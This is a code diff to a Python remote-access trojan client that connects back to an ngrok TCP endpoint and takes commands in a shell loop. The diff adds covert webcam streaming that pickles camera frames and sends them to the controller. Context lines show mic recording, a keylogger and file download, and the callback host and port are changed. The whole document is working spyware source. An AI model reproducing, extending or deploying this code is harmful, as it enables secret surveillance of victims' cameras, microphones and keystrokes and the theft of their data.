@@ -1,7 +1,9 @@
 import base64
 import ctypes
 import json
+import multiprocessing
 import os
+import pickle
 import shutil
 import socket
 import struct
@@ -11,6 +13,7 @@ import threading
 import time
 
 import cv2
+import imutils
 import mss
 import requests
 import sounddevice
@@ -141,6 +144,26 @@ def get(url):
     with open(file_name, "wb") as out_file:
         out_file.write(get_response.content)
 
+def stream(stop):
+    while True:
+        vid = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+        
+        while(vid.isOpened()):
+            img,frame = vid.read()
+            frame = imutils.resize(frame,width=320)
+            a = pickle.dumps(frame)
+            message = struct.pack("Q",len(a))+a
+            sock.sendall(message)
+            
+            # cv2.imshow('TRANSMITTING VIDEO',frame)
+            key = cv2.waitKey(1) & 0xFF
+            if key == ord('q') or stop():
+                vid.release()
+                cv2.destroyAllWindows()
+                break             
+        if stop():
+            break
+				
 
 # def connection():
 #     while True:
@@ -154,6 +177,9 @@ def get(url):
 
 
 def shell():
+    stop_threads = False
+    stream_thread = threading.Thread(target=stream, args =(lambda : stop_threads, ))
+
     while True:
         command = reliable_recv()
         print(command)
@@ -235,6 +261,13 @@ def shell():
             except:
                 reliable_send("[!!] Failed to record mic")
 
+        elif command[:6] == "stream":
+            stream_thread.start()
+
+        elif command[:11] == "stop_stream":
+            stop_threads = True
+            stream_thread.join()
+
         elif command[:6] == "keylog":
             t1 = threading.Thread(target=keylogger.start)
             t1.setDaemon(True)
@@ -295,7 +328,7 @@ def shell():
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connection()
-sock.connect(("6.tcp.ngrok.io", 14893)) # ngrok tcp 9001
+sock.connect(("4.tcp.ngrok.io", 18704)) # ngrok tcp 9001
 print("connected")
 shell()
 sock.close()
